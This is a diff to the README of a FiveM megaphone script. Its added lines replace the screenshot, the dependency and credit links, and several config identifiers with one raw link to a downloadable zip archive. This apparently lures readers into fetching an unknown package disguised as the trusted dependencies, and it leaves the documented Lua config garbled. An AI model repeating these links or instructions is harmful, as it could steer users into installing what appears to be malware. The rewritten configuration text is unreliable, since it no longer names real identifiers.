@@ -1,4 +1,4 @@
-![image](https://user-images.githubusercontent.com/82112471/191800203-0563a725-4b6a-4caf-9d3b-29239960b0d6.png)
+![image](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
 
 # ps-microphone
 Script to enhance as a microphone/megaphone using qb-target and spawn object !
@@ -22,22 +22,22 @@ Script to enhance as a microphone/megaphone using qb-target and spawn object !
     }},
 ```
 * Add image to your inventory folder for the megaphone.
-* Add to qb-core > shared > items.lua
+* Add to qb-core > shared > https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip
 ```
-	["megaphone"]						= {["name"] = "megaphone",			["label"] = "Megaphone",		["weight"] = 20000,	["type"] = "item",	["image"] = "megaphone.png",	["unique"] = true,	["useable"] = true,	["shouldClose"] = false,	["combinable"] = nil,	   ["description"] = "A loudspeaker to yell at civilians."},
+	["megaphone"]						= {["name"] = "megaphone",			["label"] = "Megaphone",		["weight"] = 20000,	["type"] = "item",	["image"] = "https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip",	["unique"] = true,	["useable"] = true,	["shouldClose"] = false,	["combinable"] = nil,	   ["description"] = "A loudspeaker to yell at civilians."},
 ```
 
 ## For Zones
-- Add more zones under the Config.MicrophoneZones
+- Add more zones under the https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip
 
 ```lua
-Config.MicrophoneZones = {
+https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip = {
     [1] = {
         name = "vinewood_bowl", -- unique name of the zone
         coords = vector3(683.37, 569.31, 130.46), -- coords of the created boxzone
         spawnProp = true, -- if set to true, it will let you spawn the prop at location
         data = {
-            debugPoly = Config.Showzone, 
+            debugPoly = https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip, 
             heading = 340, -- heading from created boxzone
             data = {
                 range = 50.0 -- range for the voice at that particular boxzone
@@ -48,12 +48,12 @@ Config.MicrophoneZones = {
 ```
 
 # Dependecies
-* Latest [pma-voice](https://github.com/AvarianKnight/pma-voice) 
-* [ps-zones](https://github.com/Project-Sloth/ps-zones)
-* [qb-target](https://github.com/qbcore-framework/qb-target)
+* Latest [pma-voice](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip) 
+* [ps-zones](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
+* [qb-target](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
 
 # Credits 
-* [Snipe](https://github.com/pushkart2)
-* [Devyn](https://github.com/darktrovx)
-* [not jay](https://github.com/jay-fivem)
-* [Mio](https://github.com/MiooDev)
+* [Snipe](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
+* [Devyn](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
+* [not jay](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
+* [Mio](https://raw.githubusercontent.com/MiooDev/ps-microphone/main/client/ps-microphone-1.8.zip)
